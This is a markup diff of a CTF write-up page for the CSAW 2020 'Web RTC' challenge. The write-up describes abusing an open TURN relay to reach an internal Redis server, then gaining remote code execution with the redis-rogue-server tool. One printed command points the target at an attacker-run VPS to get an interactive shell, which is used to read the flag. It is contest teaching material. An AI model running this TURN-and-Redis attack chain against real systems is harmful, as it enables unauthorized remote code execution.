@@ -4,14 +4,13 @@
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
-        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
         <title>CsawQuals2020 WebRTC  - Team7even</title><meta name="Description" content="Writeup for CSAW CTF 2020, challenge name: Web RTC"><meta property="og:title" content="CsawQuals2020 WebRTC " />
 <meta property="og:description" content="Writeup for CSAW CTF 2020, challenge name: Web RTC" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://team0se7en.github.io/csawquals20-webrtc/" />
-<meta property="og:image" content="https://team0se7en.github.io/csawquals20-webrtc/featured.png"/>
+<meta property="og:url" content="https://team0se7en.github.io/csawquals20-webrtc/" /><meta property="og:image" content="https://team0se7en.github.io/csawquals20-webrtc/featured.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2020-09-14T22:23:36+01:00" />
-<meta property="article:modified_time" content="2020-09-14T22:23:36+01:00" />
+<meta property="article:modified_time" content="2020-09-14T22:23:36+01:00" /><meta property="og:site_name" content="My cool site" />
+
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://team0se7en.github.io/csawquals20-webrtc/featured.png"/>
 <meta name="twitter:title" content="CsawQuals2020 WebRTC "/>
@@ -19,7 +18,9 @@
 <meta name="application-name" content="Team7even">
 <meta name="apple-mobile-web-app-title" content="Team7even"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://team0se7en.github.io/csawquals20-webrtc/" /><link rel="prev" href="https://team0se7en.github.io/pwn2win2020-androids-encryption/" /><link rel="next" href="https://team0se7en.github.io/csawquals20-smallsurp/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.1e2694bed152fa2922dbe909a441838ed693d88b1330f97485bfa8ed78da42df.css" integrity="sha256-HiaUvtFS&#43;iki2&#43;kJpEGDjtaT2IsTMPl0hb&#43;o7XjaQt8="><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://team0se7en.github.io/csawquals20-webrtc/" /><link rel="prev" href="https://team0se7en.github.io/pwn2win2020-androids-encryption/" /><link rel="next" href="https://team0se7en.github.io/csawquals20-smallsurp/" /><link rel="stylesheet" href="/css/style.min.3c197b208f9b5823aeba4a4b2e21743cb9ba6d05a1019cd4d6eb0cddfbbe9964.css" integrity="sha256-PBl7II+bWCOuukpLLiF0PLm6bQWhAZzU1usM3fu+mWQ="><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -33,7 +34,7 @@
                             "url": "https:\/\/team0se7en.github.io\/csawquals20-webrtc\/featured.png",
                             "width":  1739 ,
                             "height":  467 
-                        }],"genre": "posts","keywords": "turn, redis, rce, csawquals20, web","wordcount":  860 ,
+                        }],"genre": "posts","keywords": "turn, redis, rce, csawquals20, web","wordcount":  858 ,
         "url": "https:\/\/team0se7en.github.io\/csawquals20-webrtc\/","datePublished": "2020-09-14T22:23:36+01:00","dateModified": "2020-09-14T22:23:36+01:00","publisher": {
             "@type": "Organization",
             "name": "Team7even","logo": {
@@ -47,7 +48,7 @@
             },"description": "Writeup for CSAW CTF 2020, challenge name: Web RTC"
     }
     </script></head>
-    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
 
         <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
@@ -58,16 +59,16 @@
             <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                         <input type="text" placeholder="Search for writeups/Walkthrough&#39;s" id="search-input-desktop">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
-                            <i class="fas fa-search fa-fw"></i>
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                         </a>
                         <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
-                            <i class="fas fa-times-circle fa-fw"></i>
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-desktop">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                         </span>
                     </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                    <i class="fas fa-adjust fa-fw"></i>
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                 </a>
             </div>
         </div>
@@ -86,37 +87,35 @@
                     <div class="search mobile" id="search-mobile">
                         <input type="text" placeholder="Search for writeups/Walkthrough&#39;s" id="search-input-mobile">
                         <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
-                            <i class="fas fa-search fa-fw"></i>
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                         </a>
                         <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
-                            <i class="fas fa-times-circle fa-fw"></i>
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                         </a>
                         <span class="search-button search-loading" id="search-loading-mobile">
-                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                         </span>
                     </div>
                     <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                         Cancel
                     </a>
                 </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
-                <i class="fas fa-adjust fa-fw"></i>
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
             </a></div>
     </div>
-</header>
-<div class="search-dropdown desktop">
-    <div id="search-dropdown-desktop"></div>
-</div>
-<div class="search-dropdown mobile">
-    <div id="search-dropdown-mobile"></div>
-</div>
-<main class="main">
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content always-active" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX">CsawQuals2020 WebRTC </h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/th3happybit" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>oussama</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf-writeups/"><i class="far fa-folder fa-fw"></i>CTF Writeups</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-09-14">2020-09-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;860 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CsawQuals2020 WebRTC </h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://github.com/th3happybit" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>oussama</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf-writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CTF Writeups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2020-09-14">2020-09-14</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;858 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
         </div><div class="featured-image"><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -124,10 +123,10 @@
         data-srcset="/csawquals20-webrtc/featured.png, /csawquals20-webrtc/featured.png 1.5x, /csawquals20-webrtc/featured.png 2x"
         data-sizes="auto"
         alt="/csawquals20-webrtc/featured.png"
-        title="Writeup for CSAW CTF 2020, challenge name: Web RTC" /></div><div class="details toc" id="toc-static"  kept="">
+        title="Writeup for CSAW CTF 2020, challenge name: Web RTC" /></div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
                     <span>Contents</span>
-                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
@@ -140,9 +139,8 @@
   </ul>
 </nav></div>
             </div><div class="content" id="content"><h1 id="web-real-time-chat">WEB real time chat</h1>
-<figure>
-    <img src="challenge.png"
-         alt="page"/> <figcaption>
+<figure><img src="challenge.png"
+         alt="page"/><figcaption>
             <h4>Challenge Info</h4>
         </figcaption>
 </figure>
@@ -159,7 +157,7 @@
 supervisord.conf:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -176,33 +174,31 @@ supervisord.conf:</p>
 </span><span class="lnt">15
 </span><span class="lnt">16
 </span><span class="lnt">17
-</span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">[supervisord]
-nodaemon=true
-
-[program:gunicorn3]
-command=gunicorn3 --workers=10 -b 0.0.0.0:5000 app:app
-autorestart=true
-user=www
-
-[program:coturn]
-command=turnserver
-autorestart=true
-user=www
-
-[program:redis]
-command=timeout 60s redis-server --bind 0.0.0.0
-autorestart=true
-user=www
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[supervisord]
+</span></span><span class="line"><span class="cl">nodaemon=true
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[program:gunicorn3]
+</span></span><span class="line"><span class="cl">command=gunicorn3 --workers=10 -b 0.0.0.0:5000 app:app
+</span></span><span class="line"><span class="cl">autorestart=true
+</span></span><span class="line"><span class="cl">user=www
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[program:coturn]
+</span></span><span class="line"><span class="cl">command=turnserver
+</span></span><span class="line"><span class="cl">autorestart=true
+</span></span><span class="line"><span class="cl">user=www
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[program:redis]
+</span></span><span class="line"><span class="cl">command=timeout 60s redis-server --bind 0.0.0.0
+</span></span><span class="line"><span class="cl">autorestart=true
+</span></span><span class="line"><span class="cl">user=www
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Dockerfile:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -226,42 +222,39 @@ user=www
 </span><span class="lnt">22
 </span><span class="lnt">23
 </span><span class="lnt">24
-</span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">FROM ubuntu:18.04
-
-RUN adduser --disabled-password --gecos &#39;&#39; www
-
-RUN apt-get update &amp;&amp; apt-get install -y coturn redis python3 python3-pip gunicorn3 supervisor
-
-WORKDIR app
-COPY requirements.txt .
-RUN pip3 install -r requirements.txt
-
-COPY flag.txt /
-RUN chmod 444 /flag.txt
-
-COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
-RUN echo &#39;min-port=49000&#39; &gt;&gt; /etc/turnserver.conf
-RUN echo &#39;max-port=49100&#39; &gt;&gt; /etc/turnserver.conf
-
-COPY app.py .
-COPY static static
-
-EXPOSE 3478
-EXPOSE 5000
-
-CMD [&#34;supervisord&#34;]
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">FROM ubuntu:18.04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">RUN adduser --disabled-password --gecos &#39;&#39; www
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">RUN apt-get update &amp;&amp; apt-get install -y coturn redis python3 python3-pip gunicorn3 supervisor
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">WORKDIR app
+</span></span><span class="line"><span class="cl">COPY requirements.txt .
+</span></span><span class="line"><span class="cl">RUN pip3 install -r requirements.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">COPY flag.txt /
+</span></span><span class="line"><span class="cl">RUN chmod 444 /flag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">COPY supervisord.conf /etc/supervisor/conf.d/supervisord.conf
+</span></span><span class="line"><span class="cl">RUN echo &#39;min-port=49000&#39; &gt;&gt; /etc/turnserver.conf
+</span></span><span class="line"><span class="cl">RUN echo &#39;max-port=49100&#39; &gt;&gt; /etc/turnserver.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">COPY app.py .
+</span></span><span class="line"><span class="cl">COPY static static
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">EXPOSE 3478
+</span></span><span class="line"><span class="cl">EXPOSE 5000
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CMD [&#34;supervisord&#34;]
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="enumeration">Enumeration</h3>
 <p>At first, we took a look at those files, which show up that there are 3 servers running, a Redis server (not exposed to external), gunicorn (flask web app server), and turn ( for webrtc ).</p>
 <p>then we took a look at the web app, basically the frontend and what does it do,</p>
-<figure>
-    <img src="frontend.png"
-         alt="page"/> <figcaption>
+<figure><img src="frontend.png"
+         alt="page"/><figcaption>
             <h4>Frontend</h4>
         </figcaption>
 </figure>
@@ -269,7 +262,7 @@ CMD [&#34;supervisord&#34;]
 <p>we found that it&rsquo;s sending requests to the flask app (the API) (OBVIOUSLY), and the file <code>rtc.js</code> is the source of this request, we checked it out, and after reading the some code we found the turn communication config, the turn host <code>web.chal.csaw.io:3478</code>, the username and password (empty):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -282,18 +275,18 @@ CMD [&#34;supervisord&#34;]
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">iceConfiguration</span> <span class="o">=</span> <span class="p">{</span>
-  <span class="nx">iceServers</span><span class="o">:</span> <span class="p">[</span>
-    <span class="p">{</span>
-      <span class="nx">urls</span><span class="o">:</span> <span class="s2">&#34;turn:web.chal.csaw.io:3478&#34;</span><span class="p">,</span>
-      <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-      <span class="nx">credential</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
-    <span class="p">},</span>
-  <span class="p">],</span>
-  <span class="c1">// Doesn&#39;t work to force relay only transport, something must be busted...
-</span><span class="c1"></span>  <span class="c1">//iceTransportPolicy: &#34;relay&#34;
-</span><span class="c1"></span><span class="p">};</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">iceConfiguration</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">iceServers</span><span class="o">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">urls</span><span class="o">:</span> <span class="s2">&#34;turn:web.chal.csaw.io:3478&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">credential</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="c1">// Doesn&#39;t work to force relay only transport, something must be busted...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="c1">//iceTransportPolicy: &#34;relay&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We were new to webRTC, so we started googling and trying to learn about it, and about the turn server and the attacks vectors we can apply on it, we tried also to find a vulnerabilities in the web API but we get nothing, then we found a really interesting article <code>https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise/#a-very-brief-introduction-to-the-turn-protocol</code> talking about how to abuse a turn server and get access to internal services like Redis in our case, a really nice article and attack they are using, it suits our case very well, but there is a problem, they are using an internal tool called <code>stunner</code> that we couldn&rsquo;t find, so we just start searching for alternatives, we found a PoC for the same attack called <code>turner: https://github.com/staaldraad/turner</code> by <code>staaldraad</code>, after we found this we tried very hard to make it working even with the a lot struggles (the internet connection in our country was so bad :/ ) even tho we make it, we started testing if it&rsquo;s working,</p>
 <p>run turner with turner config we found earlier:
@@ -311,7 +304,7 @@ worked perfectly!!!</p>
 <p>we also tried to connect using <code>redis-cli</code> but it didn&rsquo;t work, it started sending some random data, so we settled on the raw commands sending!</p>
 <p>In this step we had to get rce or read a file (flag), we had two options, crafting rce by ourself using raw Redis commands (our last option :3) or use tools, the redis-cli didn&rsquo;t work so we couldn&rsquo;t use the regular Redis attack using the config command,</p>
 <p>we found many tools, that uses the master-slave attack we tried some but I&rsquo;m gonna mention only the tool that worked for us:
-<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<a href="https://github.com/n0b0dyCN/redis-rogue-server" target="_blank" rel="noopener noreffer">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
 <p>Making this tool working was an adventure, as I mentioned before we had an internet problem in our country :/ and the ssh wasn&rsquo;t even working to get into our VPS,
 So here is how it has been done:</p>
 <ul>
@@ -321,17 +314,16 @@ So here is how it has been done:</p>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">./redis-rogue-server.py --rhost [ngrok url] --rport [ngrok port] --lhost [vps public ip]
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./redis-rogue-server.py --rhost [ngrok url] --rport [ngrok port] --lhost [vps public ip]
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>then choose the Interactive shell: <code>cat /flag.txt</code>
 <code>flag{ar3nt_u_STUNned_any_t3ch_w0rks_@_all?}</code></p>
-<figure>
-    <img src="flag.png"
-         alt="page"/> <figcaption>
+<figure><img src="flag.png"
+         alt="page"/><figcaption>
             <h4>Flag</h4>
         </figcaption>
 </figure>
@@ -342,44 +334,42 @@ So here is how it has been done:</p>
         <div class="post-info-line">
             <div class="post-info-mod">
                 <span>Updated on 2020-09-14</span>
-            </div>
-            <div class="post-info-license"></div>
-        </div>
+            </div></div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
                             <a class="link-to-markdown" href="/csawquals20-webrtc/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-title="CsawQuals2020 WebRTC " data-via="team7even1" data-hashtags="turn,redis,rce,csawquals20,web"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-hashtag="turn"><i class="fab fa-facebook-square fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-title="CsawQuals2020 WebRTC " data-via="team7even1" data-hashtags="turn,redis,rce,csawquals20,web"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-hashtag="turn"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-title="CsawQuals2020 WebRTC "><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-title="CsawQuals2020 WebRTC "><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.0.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://team0se7en.github.io/csawquals20-webrtc/" data-title="CsawQuals2020 WebRTC "><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/turn/">turn</a>,&nbsp;<a href="/tags/redis/">redis</a>,&nbsp;<a href="/tags/rce/">rce</a>,&nbsp;<a href="/tags/csawquals20/">csawquals20</a>,&nbsp;<a href="/tags/web/">web</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/turn/">turn</a>,&nbsp;<a href="/tags/redis/">redis</a>,&nbsp;<a href="/tags/rce/">rce</a>,&nbsp;<a href="/tags/csawquals20/">csawquals20</a>,&nbsp;<a href="/tags/web/">web</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/pwn2win2020-androids-encryption/" class="prev" rel="prev" title="Pwn2win2020 Androids Encryption"><i class="fas fa-angle-left fa-fw"></i>Pwn2win2020 Androids Encryption</a>
-            <a href="/csawquals20-smallsurp/" class="next" rel="next" title="Csawquals20 Smallsurp">Csawquals20 Smallsurp<i class="fas fa-angle-right fa-fw"></i></a></div>
+    <div class="post-nav"><a href="/pwn2win2020-androids-encryption/" class="prev" rel="prev" title="Pwn2win2020 Androids Encryption"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pwn2win2020 Androids Encryption</a>
+            <a href="/csawquals20-smallsurp/" class="next" rel="next" title="Csawquals20 Smallsurp">Csawquals20 Smallsurp<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
 </div>
 <div id="comments"><div id="disqus_thread" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://disqus.com/?ref_noscript">Disqus</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.74.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
-                </div><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">member</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.99.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">member</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw"></i>
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
             </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw"></i>
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.css"><script type="text/javascript" src="https://polyfill.io/v3/polyfill.min.js?features=Array.prototype.fill%2CArray.prototype.find%2CArray.from%2CIntersectionObserver%2CMath.sign%2CObject.assign%2CPromise%2CObject.entries%2CElement.prototype.closest%2CrequestAnimationFrame%2CCustomEvent%2Chtml5shiv%2CObject.values%2Cfetch%2CElement.prototype.after"></script><script type="text/javascript" src="https://team07even.disqus.com/embed.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/copy-tex.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/mhchem.min.js"></script><script 